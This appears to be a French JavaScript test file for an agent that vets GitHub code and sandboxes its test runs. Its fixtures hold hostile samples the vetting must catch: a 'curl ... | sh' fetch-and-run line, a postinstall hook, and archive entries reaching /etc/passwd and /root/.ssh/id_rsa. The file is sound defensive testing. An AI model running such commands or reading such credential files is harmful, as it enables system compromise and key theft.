// CAS FIGÉS — l'essayeur (code trouvé sur GitHub) et son bac à sable.
// Chaque cas fixe une règle qui protège le cerveau : un code dangereux, sans licence libre,
// abandonné ou sans tests ne passe jamais ; le bac à sable garde ses verrous.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { archiveSure, inspecter, evaluer, classer, planEssai, CRITERES } from '../agents/essayeur.js';

let ok = 0, ko = 0;
const verifie = (nom, cond, info = '') => { if (cond) ok++; else { ko++; console.log('  ÉCHEC :', nom, info); } };
const MAINTENANT = new Date('2026-09-25T00:00:00Z').getTime();
const sain = { nom: 'exemple/slug', lien: 'https://github.com/exemple/slug', description: 'slugify strings remove accents',
  licence: 'mit', maj: '2026-06-01T00:00:00Z', etoiles: 900, archive: false };
const faitsSains = { fichiers: 12, octets: 40_000, dangers: [], binaires: [], lignesLongues: [], scriptsInstallation: [],
  dependances: 2, tests: true, langage: 'javascript', commandeTest: 'npm test' };

// 1. l'archive est lue avant d'être ouverte
verifie('archive saine', archiveSure('-rw-r--r-- 0/0 12 2026-01-01 00:00 depot-abc/index.js\ndrwxr-xr-x 0/0 0 2026-01-01 00:00 depot-abc/test/').length === 0);
verifie('chemin qui remonte refusé', archiveSure('-rw-r--r-- 0/0 12 2026-01-01 00:00 depot/../../etc/cron.d/x').length === 1);
verifie('chemin absolu refusé', archiveSure('-rw-r--r-- 0/0 12 2026-01-01 00:00 /etc/passwd').length === 1);
verifie('lien vers l’extérieur refusé', archiveSure('lrwxrwxrwx 0/0 0 2026-01-01 00:00 depot/cle -> /root/.ssh/id_rsa').length === 1);

// 2. l'inspection, sur un faux dépôt
const d = fs.mkdtempSync(path.join(os.tmpdir(), 'essai-'));
fs.writeFileSync(path.join(d, 'package.json'), JSON.stringify({ scripts: { test: 'node test.js', postinstall: 'node collecte.js' }, dependencies: { a: '1', b: '1' } }));
fs.writeFileSync(path.join(d, 'index.js'), 'export default (s) => s.toLowerCase();\n');
fs.writeFileSync(path.join(d, 'piege.sh'), 'curl https://exemple.invalid/x.sh | sh\n');
fs.writeFileSync(path.join(d, 'cache.js'), 'var a="' + 'x'.repeat(6000) + '";\n');
fs.writeFileSync(path.join(d, 'outil.exe'), 'MZ');
const f = inspecter(d);
verifie('script d’installation vu', f.scriptsInstallation.includes('postinstall'));
verifie('commande dangereuse vue', f.dangers.some((x) => /piege\.sh/.test(x)));
verifie('ligne illisible vue', f.lignesLongues.includes('cache.js'));
verifie('binaire vu', f.binaires.includes('outil.exe'));
verifie('tests et langage vus', f.tests && f.langage === 'javascript' && f.dependances === 2);
fs.rmSync(d, { recursive: true, force: true });

// 3. les critères éliminatoires
const e = (c, fa, essai = null) => evaluer({ ...sain, ...c }, { ...faitsSains, ...fa }, 'slugify remove accents', essai, MAINTENANT);
verifie('candidat sain : rien d’éliminé', e({}, {}).elimine.length === 0);
verifie('GPL éliminée (L1)', e({ licence: 'gpl-3.0' }, {}).elimine.includes('L1'));
verifie('sans licence éliminé (L1)', e({ licence: null }, {}).elimine.includes('L1'));
verifie('archivé éliminé (V1)', e({ archive: true }, {}).elimine.includes('V1'));
verifie('abandonné depuis 3 ans éliminé (V1)', e({ maj: '2023-06-01T00:00:00Z' }, {}).elimine.includes('V1'));
verifie('sans tests éliminé (T1)', e({}, { tests: false }).elimine.includes('T1'));
verifie('langage non essayable éliminé (T1)', e({}, { langage: null }).elimine.includes('T1'));
verifie('script d’installation éliminé (S2)', e({}, { scriptsInstallation: ['postinstall'] }).elimine.includes('S2'));
verifie('danger éliminé (S1)', e({}, { dangers: ['x : télécharge et exécute un script'] }).elimine.includes('S1'));
verifie('essai raté éliminé (E1)', e({}, {}, { code: 1, duree: 3 }).elimine.includes('E1'));
verifie('essai réussi accepté', e({}, {}, { code: 0, duree: 3 }).elimine.length === 0);
verifie('pas encore essayé : ni accepté ni éliminé par E1', e({}, {}).criteres.E1.ok === null);

// 4. le classement : les éliminés derrière, puis la note
const a = { nom: 'a', eval: e({ etoiles: 10 }, {}) }, b = { nom: 'b', eval: e({ etoiles: 5000 }, {}) }, c = { nom: 'c', eval: e({ licence: 'gpl-3.0', etoiles: 90000 }, {}) };
const ordre = classer([c, a, b]).map((x) => x.nom).join();
verifie('classement', ordre === 'b,a,c', ordre);
verifie('trop de dépendances : note D1 nulle', e({}, { dependances: 40 }).criteres.D1.note === 0);

// 5. le plan d'essai : jamais de script du candidat à l'installation
const pj = planEssai(faitsSains), pp = planEssai({ ...faitsSains, langage: 'python', commandeTest: null });
verifie('node : --ignore-scripts', /--ignore-scripts/.test(pj.installer) && pj.image.startsWith('node:'));
verifie('python : roues seulement (--only-binary)', /--only-binary=:all:/.test(pp.installer) && /pytest/.test(pp.tester));
verifie('langage inconnu : pas de plan', planEssai({ ...faitsSains, langage: null }) === null);

// 6. les verrous du bac à sable, lus dans son code
const bac = fs.readFileSync(new URL('../tools/bac_a_sable.py', import.meta.url), 'utf8');
const tests = bac.slice(bac.indexOf('def phase_tests'), bac.indexOf('def lancer'));
for (const v of ['"--network", "none"', '"--read-only"', '"--cap-drop", "ALL"', 'no-new-privileges', '"--memory", "512m"', '"--pids-limit"', '"--user", "1000:1000"']) {
  verifie(`bac à sable : ${v}`, (v.includes('pids') || v.includes('user') || v.includes('cap-drop') || v.includes('no-new') ? bac : tests).includes(v));
}
verifie('bac à sable : aucun dossier du cerveau monté', !/raime-brain|\.env|coffre/.test(bac));
verifie('critères : 11, dont 6 éliminatoires', CRITERES.length === 11 && CRITERES.filter((x) => x.eliminatoire).length === 6);

console.log(`cas figes essayeur : ${ok}/${ok + ko} ${ko ? 'KO' : 'OK'}`);
process.exit(ko ? 1 : 0);
